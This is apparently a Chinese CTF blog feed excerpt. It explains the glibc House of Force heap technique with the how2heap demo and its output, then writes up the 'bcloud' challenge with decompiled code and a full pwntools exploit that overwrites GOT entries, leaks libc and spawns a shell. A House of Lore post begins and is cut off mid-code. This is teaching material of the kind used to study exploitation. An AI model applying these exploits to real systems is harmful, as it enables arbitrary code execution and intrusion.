      <content type="html"><![CDATA[<h1 id="House-of-Force-原理"><a href="#House-of-Force-原理" class="headerlink" title="House of Force 原理"></a>House of Force 原理</h1><p>一个比较有意思的利用，也是第一次对top chunk 下手，原因在于堆管理中并没有多的检查top chunk的大小问题。</p><p>我们在有机会溢出改变top chunk size的情况下，可以将其改大（eg:-1，64位下即为0xffffffffffffffff，比较时会转化为无符号数），之后不论申请多大的chunk，经比较size之后，都不会去调用mmap去分配top chunk，但我们可以通过分配足够大小的chunk使之在main_arena中top chunk的指针变换位置，也就是说，我们可以将其分配之后的chunk到我们想要的地址（eg:got表），这样我们便可以通过控制我们可以控制的指针来任意地址写。</p><p>所以最起码需要：</p><ol><li>能够溢出至topchunk的size位</li><li>能够自由控制malloc大小</li></ol><p>使用how2heap的例子来解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc , char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;\nWelcome to the House of Force\n\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot;</span><br><span class="line">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;, bss_var);</span><br><span class="line">fprintf(stderr, &quot;Its current value is: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nLet&apos;s allocate the first chunk, taking space from the wilderness.\n&quot;);</span><br><span class="line">intptr_t *p1 = malloc(256);</span><br><span class="line">fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;);</span><br><span class="line">int real_size = malloc_usable_size(p1);</span><br><span class="line">fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;, real_size + sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nNow let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;);</span><br><span class="line"></span><br><span class="line">//----- VULNERABILITY ----</span><br><span class="line">intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));</span><br><span class="line">fprintf(stderr, &quot;\nThe top chunk starts at %p\n&quot;, ptr_top);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;Old size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;</span><br><span class="line">fprintf(stderr, &quot;New size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">//------------------------</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span><br><span class="line">   &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span><br><span class="line">   &quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;);</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="line"> * new_top = old_top + nb</span><br><span class="line"> * nb = new_top - old_top</span><br><span class="line"> * req + 2sizeof(long) = new_top - old_top</span><br><span class="line"> * req = new_top - old_top - 2sizeof(long)</span><br><span class="line"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="line"> * req = dest - old_top - 4*sizeof(long)</span><br><span class="line"> */</span><br><span class="line">unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;</span><br><span class="line">fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span><br><span class="line">   &quot;we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size);</span><br><span class="line">void *new_ptr = malloc(evil_size);</span><br><span class="line">fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;, new_ptr - sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">void* ctr_chunk = malloc(100);</span><br><span class="line">fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;malloc(100) =&gt; %p!\n&quot;, ctr_chunk);</span><br><span class="line">fprintf(stderr, &quot;Now, we can finally overwrite that value:\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;... old string: %s\n&quot;, bss_var);</span><br><span class="line">fprintf(stderr, &quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;);</span><br><span class="line">strcpy(ctr_chunk, &quot;YEAH!!!&quot;);</span><br><span class="line">fprintf(stderr, &quot;... new string: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// some further discussion:</span><br><span class="line">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span><br><span class="line">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span><br><span class="line">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span><br><span class="line"></span><br><span class="line">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span><br><span class="line">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span><br><span class="line"></span><br><span class="line">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the House of Force</span><br><span class="line"></span><br><span class="line">The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.</span><br><span class="line">The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.</span><br><span class="line"></span><br><span class="line">In the end, we will use this to overwrite a variable at 0x602060.</span><br><span class="line">Its current value is: This is a string that we want to overwrite.</span><br><span class="line"></span><br><span class="line">Let&apos;s allocate the first chunk, taking space from the wilderness.</span><br><span class="line">The chunk of 256 bytes has been allocated at 0xd61f90.</span><br><span class="line"></span><br><span class="line">Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.</span><br><span class="line">Real size (aligned and all that jazz) of our allocated chunk is 280.</span><br><span class="line"></span><br><span class="line">Now let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk</span><br><span class="line"></span><br><span class="line">The top chunk starts at 0xd62110</span><br><span class="line"></span><br><span class="line">Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.</span><br><span class="line">Old size of top chunk 0x20ef1</span><br><span class="line">New size of top chunk 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.</span><br><span class="line">Next, we will allocate a chunk that will get us right up against the desired region (with an integer</span><br><span class="line">overflow) and will then be able to allocate a chunk right over the desired region.</span><br><span class="line"></span><br><span class="line">The value we want to write to at 0x602060, and the top chunk is at 0xd62110, so accounting for the header size,</span><br><span class="line">we will malloc 0xffffffffff89ff30 bytes.</span><br><span class="line">As expected, the new pointer is at the same place as the old top chunk: 0xd62110</span><br><span class="line"></span><br><span class="line">Now, the next chunk we overwrite will point at our target buffer.</span><br><span class="line">malloc(100) =&gt; 0x602060!</span><br><span class="line">Now, we can finally overwrite that value:</span><br><span class="line">... old string: This is a string that we want to overwrite.</span><br><span class="line">... doing strcpy overwrite with &quot;YEAH!!!&quot;...</span><br><span class="line">... new string: YEAH!!!</span><br></pre></td></tr></table></figure><p>原理可以参考：<a href="https://bbs.pediy.com/thread-222924.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222924.htm</a></p><h1 id="bcloud"><a href="#bcloud" class="headerlink" title="bcloud"></a>bcloud</h1><p>回家做的第一道，看了半天没看出来漏洞。。。name的输出函数被漏掉了。。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>刚进去要输入name</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">unsigned int get_name()</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+1Ch] [ebp-5Ch]</span><br><span class="line">  char *name_; // [esp+5Ch] [ebp-1Ch]</span><br><span class="line">  unsigned int v3; // [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;s, 0, 0x50u);</span><br><span class="line">  puts(&quot;Input your name:&quot;);</span><br><span class="line">  read_str((int)&amp;s, 0x40, &apos;\n&apos;);</span><br><span class="line">  name_ = (char *)malloc(0x40u);</span><br><span class="line">  name_ptr = (int)name_;</span><br><span class="line">  strcpy(name_, &amp;s);</span><br><span class="line">  puts_(name_);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后要输入Org &amp; Host,漏洞的主力。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned int get_org_host()</span><br><span class="line">&#123;</span><br><span class="line">  char org; // [esp+1Ch] [ebp-9Ch]</span><br><span class="line">  char *o; // [esp+5Ch] [ebp-5Ch]</span><br><span class="line">  int host; // [esp+60h] [ebp-58h]</span><br><span class="line">  char *h; // [esp+A4h] [ebp-14h]</span><br><span class="line">  unsigned int v5; // [esp+ACh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;org, 0, 0x90u);</span><br><span class="line">  puts(&quot;Org:&quot;);</span><br><span class="line">  read_str((int)&amp;org, 0x40, &apos;\n&apos;);</span><br><span class="line">  puts(&quot;Host:&quot;);</span><br><span class="line">  read_str((int)&amp;host, 0x40, &apos;\n&apos;);</span><br><span class="line">  h = (char *)malloc(0x40u);</span><br><span class="line">  o = (char *)malloc(0x40u);</span><br><span class="line">  org_ptr = (int)o;</span><br><span class="line">  host_ptr = (int)h;</span><br><span class="line">  strcpy(h, (const char *)&amp;host);</span><br><span class="line">  strcpy(o, &amp;org);                             &lt;------strcpy这里出的问题</span><br><span class="line">  puts(&quot;OKay! Enjoy:)&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进去之后就是一个创建编辑删除同步note的程序，show，syn，quit没什么用</p><p>new_note:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int new_note()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  signed int i; // [esp+18h] [ebp-10h]</span><br><span class="line">  int length; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt;= 9 &amp;&amp; ptr[i]; ++i )          //最多十个</span><br><span class="line">    ;</span><br><span class="line">  if ( i == 10 )</span><br><span class="line">    return puts(&quot;Lack of space. Upgrade your account with just $100 :)&quot;);</span><br><span class="line">  puts(&quot;Input the length of the note content:&quot;);</span><br><span class="line">  length = get_num();</span><br><span class="line">  ptr[i] = (int)malloc(length + 4);                   //大小用户定义</span><br><span class="line">  if ( !ptr[i] )</span><br><span class="line">    exit(-1);</span><br><span class="line">  len_[i] = length;</span><br><span class="line">  puts(&quot;Input the content:&quot;);</span><br><span class="line">  read_str(ptr[i], length, &apos;\n&apos;);</span><br><span class="line">  printf(&quot;Create success, the id is %d\n&quot;, i);</span><br><span class="line">  result = i;</span><br><span class="line">  syn_inuse[i] = 0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // ST1C_4</span><br><span class="line">  int i; // [esp+14h] [ebp-14h]</span><br><span class="line">  int id_ptr; // [esp+18h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Input the id:&quot;);</span><br><span class="line">  i = get_num();</span><br><span class="line">  if ( i &lt; 0 || i &gt; 9 )</span><br><span class="line">    return puts(&quot;Invalid ID.&quot;);</span><br><span class="line">  id_ptr = ptr[i];</span><br><span class="line">  if ( !id_ptr )</span><br><span class="line">    return puts(&quot;Note has been deleted.&quot;);</span><br><span class="line">  v1 = len_[i];</span><br><span class="line">  syn_inuse[i] = 0;</span><br><span class="line">  puts(&quot;Input the new content:&quot;);</span><br><span class="line">  read_str(id_ptr, v1, &apos;\n&apos;);</span><br><span class="line">  return puts(&quot;Edit success.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [esp+18h] [ebp-10h]</span><br><span class="line">  void *ptr_; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Input the id:&quot;);</span><br><span class="line">  i = get_num();</span><br><span class="line">  if ( i &lt; 0 || i &gt; 9 )</span><br><span class="line">    return puts(&quot;Invalid ID.&quot;);</span><br><span class="line">  ptr_ = (void *)ptr[i];</span><br><span class="line">  if ( !ptr_ )</span><br><span class="line">    return puts(&quot;Note has been deleted.&quot;);</span><br><span class="line">  ptr[i] = 0;</span><br><span class="line">  len_[i] = 0;</span><br><span class="line">  free(ptr_);</span><br><span class="line">  return puts(&quot;Delete success.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>主程序看了一遍又一遍，还是没发现任何漏洞。回头看，问题出现在前面：</p><p>name是用read读取的，结尾没有’\x00’;而输出是以读取到’\x00’为止的，那么就可以泄露堆地址。<br>(ps: 大概是在strcpy到指定大小的地址时，如果写入大小与目标地址大小相同，则在后面会添加目标地址的指针。具体原因目前未明)</p><p>org &amp; host 这边的strcpy操作会自动在结尾加’\n’,结果就是在一通复制完之后，可以修改topchunk的size使之变为0xffffffff，满足houseofforce条件</p><p>之后进入程序。</p><p>计算大小将topchunk调整到bss段的len[]及ptr[]附近，欺骗程序chunk的分配。之后的思路在exp中写的很清楚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level =&apos;debug&apos;</span><br><span class="line">sh = process(&apos;./bcloud&apos;)</span><br><span class="line">elf = ELF(&apos;./bcloud&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">#-----------get heap_base------------</span><br><span class="line">sh.recvuntil(&apos;Input your name:\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos;*64)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*64)</span><br><span class="line">heap_base = u32(sh.recv()[:4])-8</span><br><span class="line">print &apos;heap_base: &apos;+hex(heap_base)</span><br><span class="line"></span><br><span class="line">#---------house of force----------------!!!!!!!!!!</span><br><span class="line">sh.send(&apos;b&apos;*0x40)</span><br><span class="line">#sh.recvuntil(&apos;Host:&apos;)</span><br><span class="line">sh.sendline(p32(0xffffffff))</span><br><span class="line">#b(0x8048978)</span><br><span class="line">#gdb.attach(sh)#,&apos;b&apos; *0x804895e)</span><br><span class="line"></span><br><span class="line">#------------calc malloc size----------------!!!!!!!!!!!!</span><br><span class="line">topchunk_addr = heap_base + 0xd8</span><br><span class="line">print &apos;topchunk_addr: &apos;+hex(topchunk_addr)</span><br><span class="line">len_addr  = 0x0804b0a0</span><br><span class="line">list_addr = 0x0804b120</span><br><span class="line">target_addr = len_addr - 8</span><br><span class="line">size = target_addr - topchunk_addr-4-7</span><br><span class="line">print str(size)</span><br><span class="line">#----------edit topchunk to size[i]--------------</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;option---&gt;&gt;\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">#sh.recv()</span><br><span class="line">sh.sendline(str(size-4))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--------------edit ptr to got_addr---------------</span><br><span class="line"></span><br><span class="line">payload = p32(16) *3 + (list_addr-len_addr-12)*&apos;a&apos;</span><br><span class="line">payload += p32(elf.got[&apos;free&apos;]) +p32( elf.got[&apos;atoi&apos;])*2</span><br><span class="line">#+elf.got[&apos;atoi&apos;] </span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">#sh.recv()</span><br><span class="line">sh.sendline(&apos;1000&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#sh.recv()</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(p32(elf.plt[&apos;puts&apos;]))</span><br><span class="line"></span><br><span class="line">#---------leak atoi_addr to get system_addr-----------------</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">atoi_plt = sh.recv()[:4]</span><br><span class="line">#sh.recv()</span><br><span class="line">system_addr = u32(atoi_plt) - libc.symbols[&apos;atoi&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">print &apos;system_addr: &apos;+hex(system_addr)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#-------------edit atoi to system------------------</span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(p32(system_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--------------------- get shell------------------</span><br><span class="line">sh.sendlineafter(&apos;option---&gt;&gt;&apos;, &apos;/bin/sh\x00&apos;)</span><br><span class="line">#sh.send(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.6-HouseOfLore</title>
      <link href="/2019/01/22/introduction-to-pwn2-6-houseoflore/"/>
      <url>/2019/01/22/introduction-to-pwn2-6-houseoflore/</url>
      <content type="html"><![CDATA[<h1 id="House-of-Lore-原理"><a href="#House-of-Lore-原理" class="headerlink" title="House of Lore 原理"></a>House of Lore 原理</h1><p>看了下原理，没有太多的东西，和house of spirit的思想是一样的，只是spirit是在fastbin大小的chunk范围内伪造fake chunk，而House of Lore是small bin 与 large bin大小的chunk ， 不过后来因为large bin添加了保护措施，便无法再利用。</p><p>house of lore 相比会麻烦一点，毕竟smallbin的检查比较多，因而大部分准备都是为了能够绕过检测。</p><p>单拿例子说一下吧，有对应的练习之后再加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">struct small_chunk &#123;</span><br><span class="line">  size_t prev_size;</span><br><span class="line">  size_t size;</span><br><span class="line">  struct small_chunk *fd;</span><br><span class="line">  struct small_chunk *bk;</span><br><span class="line">  char buf[0x64];               // chunk falls in smallbin size range</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct small_chunk fake_chunk;                  // At address 0x7ffdeb37d050</span><br><span class="line">struct small_chunk another_fake_chunk;</span><br><span class="line">struct small_chunk *real_chunk;</span><br><span class="line">unsigned long long *ptr, *victim;</span><br><span class="line">int len;</span><br><span class="line"></span><br><span class="line">len = sizeof(struct small_chunk);</span><br><span class="line"></span><br><span class="line">// Grab two small chunk and free the first one</span><br><span class="line">// This chunk will go into unsorted bin</span><br><span class="line">ptr = malloc(len);                              // points to address 0x1a44010</span><br><span class="line"></span><br><span class="line">// The second malloc can be of random size. We just want that</span><br><span 